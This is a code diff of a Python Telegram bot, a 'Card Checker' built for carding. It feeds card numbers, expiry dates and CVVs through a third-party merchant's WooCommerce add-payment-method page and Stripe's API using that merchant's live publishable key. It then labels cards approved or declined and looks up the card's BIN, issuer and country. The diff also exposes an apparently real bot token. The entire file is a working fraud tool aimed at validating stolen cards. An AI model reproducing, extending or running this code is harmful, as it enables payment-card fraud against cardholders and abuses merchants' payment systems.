@@ -1,52 +1,54 @@
-import os
 import aiohttp
 import asyncio
 from datetime import datetime
 from aiogram import Bot, Dispatcher, types
-from aiogram.types import InputFile, InlineKeyboardMarkup, InlineKeyboardButton
-from aiogram.utils import executor
 
 # ==== CONFIG ====
-TOKEN = "8003502803:AAHz0pg5zbhjZaeNsdR3FudgT2Yx1PMuF0s"  # <--- put your token here
+TOKEN = "8003502803:AAHz0pg5zbhjZaeNsdR3FudgT2Yx1PMuF0s"
 DOMAIN = "https://infiniteautowerks.com/"
 PK = "pk_live_51MwcfkEreweRX4nmQHMS2A6b1LooXYEf671WoSSZTusv9jAbcwEwE5cOXsOAtdCwi44NGBrcmnzSy7LprdcAs2Fp00QKpqinae"
-CHECKER_NAME = "Bᴜɴɴʏ"  # your checker name
+CHECKER_NAME = "Bᴜɴɴʏ"
 
 bot = Bot(token=TOKEN)
 dp = Dispatcher(bot)
 
-# ==== CACHES FOR BUTTONS ====
-approved_cache = {}
-declined_cache = {}
-total_cache = {}
-
-# ==== UTILITIES ====
-def format_result(card, status, gate, bin_, country, issuer, typ, time, by):
+# ==== CLASSIC UI ====
+def format_result(card, status, response, gate, bin_, country, issuer, typ, time, by):
     return (
-        "━━━━━━━━━━━━━━━\n"
-        f"[💳] 𝗖𝗮𝗿𝗱: <code>{card}</code>\n"
-        f"[🚦] 𝗦𝘁𝗮𝘁𝘂𝘀: <b>{status}</b>\n"
-        f"[🔗] 𝗚𝗮𝘁𝗲: <b>{gate}</b>\n"
-        "━━━━━━━━━━━━━━━\n"
-        f"[🏦] 𝗕𝗜𝗡: <code>{bin_}</code>\n"
-        f"[🌎] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: <b>{country}</b>\n"
-        f"[🏢] 𝗜𝘀𝘀𝘂𝗲𝗿: <b>{issuer}</b>\n"
-        f"[💠] 𝗧𝘆𝗽𝗲: <b>{typ}</b>\n"
-        "━━━━━━━━━━━━━━━\n"
-        f"[⏰] 𝗧𝗶𝗺𝗲: <code>{time}</code>\n"
-        f"[👤] 𝗕𝘆: <b>{by}</b>\n"
-        "━━━━━━━━━━━━━━━"
+        f"[ϟ] 𝗖𝗖 - <code>{card}</code>\n"
+        f"[ϟ] 𝗦𝘁𝗮𝘁𝘂𝘀 : {status}\n"
+        f"[ϟ] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 : {response}\n"
+        f"[ϟ] 𝗚𝗮𝘁𝗲 - {gate}\n"
+        "━━━━━━━━━━━━━\n"
+        f"[ϟ] 𝗕𝗶𝗻 : {bin_}\n"
+        f"[ϟ] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 : {country}\n"
+        f"[ϟ] 𝗜𝘀𝘀𝘂𝗲𝗿 : {issuer}\n"
+        f"[ϟ] 𝗧𝘆𝗽𝗲 : {typ}\n"
+        "━━━━━━━━━━━━━\n"
+        f"[ϟ] 𝗧𝗶𝗺𝗲 : {time}\n"
+        f"[ϟ] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 : <b>{by}</b>"
     )
 
-def get_bin_info(cc):
-    # 🟡 Replace with a real BIN lookup if needed
-    bin_ = cc[:6]
-    # Demo data for sample BIN
-    bin_data = {
-        "451015": ("CANADA 🇨🇦", "ROYAL BANK OF CANADA", "CREDIT - VISA"),
-        # add more bins if you want
-    }
-    return bin_data.get(bin_, ("UNKNOWN", "UNKNOWN", "UNKNOWN"))
+# ==== BIN LOOKUP ====
+async def get_bin_info(bin_):
+    try:
+        url = f"https://bins.antipublic.cc/bins/{bin_}"
+        async with aiohttp.ClientSession() as session:
+            async with session.get(url, timeout=10) as resp:
+                if resp.status == 200:
+                    text = await resp.text()
+                    line = text.strip().split('\n')[0]
+                    parts = [p.strip() for p in line.split(",")]
+                    if len(parts) >= 6:
+                        scheme = parts[1]
+                        typ = parts[2]
+                        country = parts[4]
+                        issuer = parts[3]
+                        card_type = f"{typ.upper()} - {scheme.upper()}"
+                        return country, issuer, card_type
+    except Exception as e:
+        print("BIN lookup error:", e)
+    return "UNKNOWN", "UNKNOWN", "UNKNOWN"
 
 def parseX(data, start, end):
     try:
@@ -55,6 +57,37 @@ def parseX(data, start, end):
         return data[star:last]
     except ValueError:
         return "None"
+
+# ==== SITE RESPONSE PARSER ====
+def parse_site_response(site_text):
+    lower = site_text.lower()
+    if "succeeded" in lower or "setup_intent" in lower or "approved" in lower or "payment method added" in lower or "success" in lower:
+        return "APPROVED", "Payment method successfully added ✅"
+    elif "insufficient funds" in lower:
+        return "APPROVED", "Payment method successfully added ✅ (Insufficient funds)"
+    elif "3d secure" in lower or "authentication required" in lower or "three_d_secure" in lower:
+        return "DECLINED", "3D Secure authentication required 🔒"
+    elif "incorrect_cvc" in lower or "cvc was incorrect" in lower or "security code is incorrect" in lower:
+        return "DECLINED", "Incorrect CVC"
+    elif "card was declined" in lower or "card_declined" in lower or ("declined" in lower and "insufficient" not in lower):
+        return "DECLINED", "Card was declined"
+    elif "expired_card" in lower:
+        return "DECLINED", "Expired card"
+    elif "pickup_card" in lower:
+        return "DECLINED", "Pick up card (stolen/lost)"
+    elif "processing_error" in lower:
+        return "DECLINED", "Processing error"
+    elif "do_not_honor" in lower:
+        return "DECLINED", "Do not honor"
+    elif "incorrect_number" in lower or "invalid number" in lower:
+        return "DECLINED", "Incorrect card number"
+    elif "balance not sufficient" in lower or "insufficient balance" in lower:
+        return "DECLINED", "Insufficient balance"
+    elif "invalid_account" in lower:
+        return "DECLINED", "Invalid account"
+    else:
+        preview = site_text.strip()[:100].replace('\n', ' ')
+        return "DECLINED", preview if preview else "Unknown site response"
 
 async def make_request(session, url, method="POST", params=None, headers=None, data=None, json=None):
     async with session.request(
@@ -67,8 +100,8 @@ async def make_request(session, url, method="POST", params=None, headers=None, d
     ) as response:
         return await response.text()
 
+# ==== LIVE CHECKER ====
 async def ppc(cards):
-    # You can improve error checking here
     cc, mon, year, cvv = cards.split("|")
     year = year[-2:]
 
@@ -89,7 +122,6 @@ async def ppc(cards):
             "upgrade-insecure-requests": "1",
             "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
         }
-
         req = await make_request(
             my_session,
             url=f"{DOMAIN}/my-account/add-payment-method/",
@@ -114,7 +146,6 @@ async def ppc(cards):
             "sec-fetch-site": "same-site",
             "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
         }
-
         data2 = {
             "type": "card",
             "card[number]": f"{cc}",
@@ -140,7 +171,6 @@ async def ppc(cards):
             "key": PK,
             "_stripe_version": "2024-06-20",
         }
-
         req2 = await make_request(
             my_session,
             f"https://api.stripe.com/v1/payment_methods",
@@ -178,11 +208,8 @@ async def ppc(cards):
             headers=headers3,
             data=data3,
         )
-        # Mocking: simulate status for demo, replace with actual parsing logic
-        if "succeeded" in req4 or "APPROVED" in req4 or "setup_intent" in req4:
-            return "APPROVED"
-        else:
-            return "DECLINED"
+        status, response = parse_site_response(req4)
+        return status, response
 
 # ==== BOT COMMANDS ====
 
@@ -191,13 +218,11 @@ async def start_help(message: types.Message):
     await message.reply(
         "<b>Card Checker Bot</b>\n\n"
         "Commands:\n"
-        "• /chk <code>CC|MM|YY|CVV</code> — Single check\n"
-        "• /mchk <code>CC|MM|YY|CVV</code> — Same as /chk\n"
-        "• /mass — Mass check (upload .txt file, max 20)\n",
+        "• /chk <code>CC|MM|YY|CVV</code> — Single check\n",
         parse_mode="HTML"
     )
 
-@dp.message_handler(commands=["chk", "mchk"])
+@dp.message_handler(commands=["chk"])
 async def chk_handler(message: types.Message):
     args = message.get_args().strip()
     if not args:
@@ -206,78 +231,17 @@ async def chk_handler(message: types.Message):
     card = args
     checking_msg = await message.reply(f"🔄 Checking: <code>{card}</code>", parse_mode="HTML")
     try:
-        result = await ppc(card)
-        status = "APPROVED ✅" if "APPROVED" in result else "DECLINED ❌"
-        bin_, country, issuer, typ = card[:6], *get_bin_info(card)
+        status_raw, response = await ppc(card)
+        status = "APPROVED ✅" if "APPROVED" in status_raw else "DECLINED ❌"
+        bin_ = card[:6]
+        country, issuer, typ = await get_bin_info(bin_)
         now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        text = format_result(card, status, "Stripe Auth", bin_, country, issuer, typ, now, CHECKER_NAME)
+        user_name = message.from_user.first_name if message.from_user else CHECKER_NAME
+        text = format_result(card, status, response, "Stripe Auth", bin_, country, issuer, typ, now, user_name)
         await checking_msg.edit_text(text, parse_mode="HTML")
     except Exception as e:
         await checking_msg.edit_text(f"Error: <code>{e}</code>", parse_mode="HTML")
 
-@dp.message_handler(commands=["mass"])
-async def mass_check_prompt(message: types.Message):
-    await message.reply("Send me a <b>.txt</b> file with up to 20 cards (<code>CC|MM|YY|CVV</code> per line).", parse_mode="HTML")
-
-@dp.message_handler(content_types=types.ContentType.DOCUMENT)
-async def handle_document(message: types.Message):
-    doc = message.document
-    if not doc.file_name.endswith(".txt"):
-        await message.reply("Only .txt files are supported.")
-        return
-    file = await doc.download()
-    with open(file.name, "r") as f:
-        lines = [line.strip() for line in f if line.strip()]
-    os.remove(file.name)
-    if len(lines) > 20:
-        await message.reply("❌ Maximum 20 cards allowed in mass check.")
-        return
-    checking_msg = await message.reply(f"🔄 Checking {len(lines)} cards...", parse_mode="HTML")
-    approved, declined = [], []
-    for i, card in enumerate(lines, 1):
-        try:
-            result = await ppc(card)
-            if "APPROVED" in result:
-                approved.append(card)
-            else:
-                declined.append(card)
-        except:
-            declined.append(card)
-    # Save for callbacks
-    uid = message.from_user.id
-    approved_cache[uid] = approved
-    declined_cache[uid] = declined
-    total_cache[uid] = lines
-    # Create buttons
-    kb = InlineKeyboardMarkup(row_width=2)
-    kb.add(
-        InlineKeyboardButton(f"✅ Approved ({len(approved)})", callback_data="show_approved"),
-        InlineKeyboardButton(f"❌ Declined ({len(declined)})", callback_data="show_declined"),
-        InlineKeyboardButton(f"🔢 Total: {len(lines)}", callback_data="show_total")
-    )
-    summary = (
-        f"✅ <b>Approved:</b> {len(approved)}\n"
-        f"❌ <b>Declined:</b> {len(declined)}\n"
-        f"🔢 <b>Total:</b> {len(lines)}"
-    )
-    await checking_msg.edit_text("🎉 <b>Check complete!</b>\n" + summary, parse_mode="HTML", reply_markup=kb)
-
-@dp.callback_query_handler(lambda c: c.data in ["show_approved", "show_declined", "show_total"])
-async def process_callback_btn(callback_query: types.CallbackQuery):
-    user_id = callback_query.from_user.id
-    if callback_query.data == "show_approved":
-        cards = approved_cache.get(user_id, [])
-        text = "✅ <b>Approved Cards</b>:\n" + "\n".join(f"<code>{c}</code>" for c in cards) if cards else "No approved cards."
-    elif callback_query.data == "show_declined":
-        cards = declined_cache.get(user_id, [])
-        text = "❌ <b>Declined Cards</b>:\n" + "\n".join(f"<code>{c}</code>" for c in cards) if cards else "No declined cards."
-    elif callback_query.data == "show_total":
-        cards = total_cache.get(user_id, [])
-        text = "🔢 <b>All Cards</b>:\n" + "\n".join(f"<code>{c}</code>" for c in cards)
-    await callback_query.answer()
-    await callback_query.message.reply(text, parse_mode="HTML")
-
-# ==== RUN BOT ====
 if __name__ == "__main__":
     from aiogram import executor
     executor.start_polling(dp, skip_updates=True)
